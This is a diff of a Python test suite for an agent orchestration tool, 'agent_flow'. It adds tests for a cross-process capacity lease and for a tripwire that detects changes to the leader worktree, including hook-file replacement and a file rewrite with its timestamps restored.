-                     "--subject", "s", "--description", "d"], cwd=root).returncode == 0
-    for worker in ("w1", "w2"):
-        assert _cli(["team", "worker", "--root", ".", "--team", "ft", "--name", worker,
-                     "--role", "impl"], cwd=root).returncode == 0
-    for tid, worker, scope in (("t1", "w1", "src/a"), ("t2", "w2", "src/b")):
-        assert _cli(["team", "brief", "--root", ".", "--team", "ft", "--task", tid,
-                     "--worker", worker, "--brief", "Use the worker-brief contract.",
-                     "--write-scope", scope], cwd=root).returncode == 0
-        assert _cli(["team", "approve-worker", "--root", ".", "--team", "ft", "--task", tid,
-                     "--worker", worker, "--write-scope", scope], cwd=root).returncode == 0
-
-
-def test_capacity_gate_holds_when_a_slot_is_already_taken(tmp_path):
-    """불변: capacity 검사는 claim과 같은 구간에서 최신 in-progress 수를 보고 판정한다."""
+def test_repository_global_capacity_serializes_processes(tmp_path):
     _init_repo(tmp_path)
-    _team_fixture(tmp_path)
-    # w1이 t1을 잡아 슬롯 하나를 소진한다.
-    assert _cli(["team", "claim", "--root", ".", "--team", "ft", "--task", "t1",
-                 "--worker", "w1"], cwd=tmp_path).returncode == 0
-
-    blocked = _cli(
-        ["team", "run-next", "--root", ".", "--team", "ft", "--worker", "w2",
-         "--command", sys.executable, "-c", "print('must not run')"],
-        cwd=tmp_path, env={"AGENT_FLOW_MAX_WORKERS": "1"},
+    ready = tmp_path / "lease-ready"
+    stop = tmp_path / "lease-stop"
+    holder_code = (
+        "import sys, time\n"
+        "from pathlib import Path\n"
+        "from agent_flow.core.worktree_isolation import provider_lease\n"
+        "root, ready, stop = map(Path, sys.argv[1:4])\n"
+        "with provider_lease(root, capacity=1):\n"
+        "    ready.write_text('ready', encoding='utf-8')\n"
+        "    while not stop.exists(): time.sleep(0.01)\n"
     )
-    assert blocked.returncode == 2
-    assert "worker capacity reached" in (blocked.stdout + blocked.stderr)
-    # 막혔다면 t2는 아직 아무도 잡지 않았어야 한다.
-    assert "must not run" not in blocked.stdout
-
-    # falsification: 여유가 있으면 같은 명령이 실제로 통과한다.
-    allowed = _cli(
-        ["team", "run-next", "--root", ".", "--team", "ft", "--worker", "w2",
-         "--command", sys.executable, "-c", "print('worker ran')"],
-        cwd=tmp_path, env={"AGENT_FLOW_MAX_WORKERS": "4"},
+    env = dict(os.environ)
+    env["PYTHONPATH"] = SRC
+    holder = subprocess.Popen(
+        [sys.executable, "-c", holder_code, str(tmp_path), str(ready), str(stop)],
+        cwd=tmp_path,
+        env=env,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
     )
-    assert allowed.returncode == 0, allowed.stdout + allowed.stderr
-    assert "t2 completed" in allowed.stdout
+    deadline = time.monotonic() + 5
+    while not ready.exists() and holder.poll() is None and time.monotonic() < deadline:
+        time.sleep(0.01)
+    assert ready.exists(), holder.communicate(timeout=1)[1]
+    assert probe_provider_leases(tmp_path) == "active"
+
+    contender_code = (
+        "import sys\n"
+        "from pathlib import Path\n"
+        "from agent_flow.core.worktree_isolation import "
+        "ProviderLeaseUnavailable, provider_lease\n"
+        "try:\n"
+        "    with provider_lease(Path(sys.argv[1]), capacity=1): pass\n"
+        "except ProviderLeaseUnavailable:\n"
+        "    raise SystemExit(23)\n"
+    )
+    blocked = subprocess.run(
+        [sys.executable, "-c", contender_code, str(tmp_path)],
+        cwd=tmp_path,
+        env=env,
+        capture_output=True,
+        text=True,
+    )
+    assert blocked.returncode == 23, blocked.stderr
+
+    stop.write_text("stop", encoding="utf-8")
+    holder_stdout, holder_stderr = holder.communicate(timeout=5)
+    assert holder.returncode == 0, holder_stdout + holder_stderr
+    assert probe_provider_leases(tmp_path) == "inactive"
+    acquired = subprocess.run(
+        [sys.executable, "-c", contender_code, str(tmp_path)],
+        cwd=tmp_path,
+        env=env,
+        capture_output=True,
+        text=True,
+    )
+    assert acquired.returncode == 0, acquired.stderr
 
 
 def test_state_root_refuses_to_fall_back_into_the_leader(tmp_path, monkeypatch):
@@ -931,6 +1682,17 @@ def test_tripwire_ignores_generated_bytecode(tmp_path):
     W_ISO.assert_leader_unchanged(tmp_path, before)
 
 
+def test_tripwire_detects_bytecode_written_outside_runtime(tmp_path):
+    """불변: 일반 project 경로의 bytecode 쓰기는 leader 누출이지 runtime 상태가 아니다."""
+    _, before = _isolated(tmp_path, "project-pyc")
+    cache = tmp_path / "src" / "pkg" / "__pycache__"
+    cache.mkdir(parents=True)
+    (cache / "module.cpython-312.pyc").write_bytes(b"\x00leaked-bytecode\n")
+
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
 def test_tripwire_ignores_every_declared_state_dir(tmp_path):
     """불변: `AGENT_FLOW_STATE_DIRS`는 `artifacts.init_project`와 같은 소스다.
 
@@ -974,6 +1736,32 @@ def test_tripwire_sees_inside_gitignored_agent_flow(tmp_path):
     planted.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
     with pytest.raises(W_ISO.WorktreeIsolationError):
         W_ISO.assert_leader_unchanged(tmp_path, before)
+def test_tripwire_detects_arbitrary_ignored_rewrite_with_restored_mtime(tmp_path):
+    target = tmp_path / ".scratch" / "cache.bin"
+    target.parent.mkdir(parents=True)
+    target.write_bytes(b"before")
+    (tmp_path / ".gitignore").write_text(
+        ".agent-flow/\n.scratch/\n",
+        encoding="utf-8",
+    )
+    _init_repo(tmp_path)
+    W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="ignored-rewrite"),
+    )
+    before = capture_leader_snapshot(tmp_path)
+    original_times = target.stat()
+
+    target.write_bytes(b"after!")
+    os.utime(
+        target,
+        ns=(original_times.st_atime_ns, original_times.st_mtime_ns),
+    )
+
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
 
 
 def test_tripwire_ignores_the_folded_agent_flow_record(tmp_path):
@@ -1001,10 +1789,13 @@ def test_tripwire_ignores_the_folded_agent_flow_record(tmp_path):
         ".venv/bin/agent-flow",
         "node_modules/.bin/tsc",
         ".claude/settings.json",
+        ".claude/settings.local.json",
         ".claude/hooks/pre.sh",
         ".Codex/hooks.json",
         ".codex/hooks.json",
+        ".omp/config.json",
         ".omp/extensions/agent-flow-hooks.ts",
+        ".scratch/cache.bin",
     ],
 )
 def test_tripwire_detects_execution_surface_replacement(tmp_path, relative):
@@ -1151,6 +1942,32 @@ def test_non_git_project_disarms_before_any_git_fact(tmp_path, monkeypatch):
     assert_leader_unchanged(tmp_path, snapshot)
 
 
+def test_tripwire_snapshot_ignores_helper_rebinding_during_capture(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    _init_repo(tmp_path)
+    expected_head = _git("rev-parse", "HEAD", cwd=tmp_path).stdout.strip()
+    expected_status = W_ISO._leader_status(tmp_path, include_ignored=True)
+    real_retry = W_ISO.with_git_lock_retry
+
+    def injecting_retry(operation, *, is_retryable):
+        monkeypatch.setattr(W_ISO, "_git_fact", lambda *_args: "forged")
+        monkeypatch.setattr(
+            W_ISO,
+            "_leader_status",
+            lambda *_args, **_kwargs: "forged",
+        )
+        return real_retry(operation, is_retryable=is_retryable)
+
+    monkeypatch.setattr(W_ISO, "with_git_lock_retry", injecting_retry)
+    snapshot = capture_leader_snapshot(tmp_path)
+
+    assert snapshot.head == expected_head
+    assert snapshot.branch == "main"
+    assert snapshot.status == expected_status
+
+
 def test_tripwire_retries_transient_git_lock_contention(tmp_path, monkeypatch):
     """불변: 일시적 `.git/index.lock` 경합은 관측을 다시 찍어 넘긴다.
 
@@ -1233,7 +2050,10 @@ def test_tripwire_reports_a_real_leader_diff_without_retrying(tmp_path, monkeypa
     monkeypatch.setattr(
         W_ISO,
         "_leader_status",
-        lambda root, _real=W_ISO._leader_status: observed.append(root) or _real(root),
+        lambda root, *, include_ignored=True, _real=W_ISO._leader_status: (
+            observed.append(root)
+            or _real(root, include_ignored=include_ignored)
+        ),
     )
     with pytest.raises(WorktreeIsolationError) as failed:
         assert_leader_unchanged(tmp_path, before)
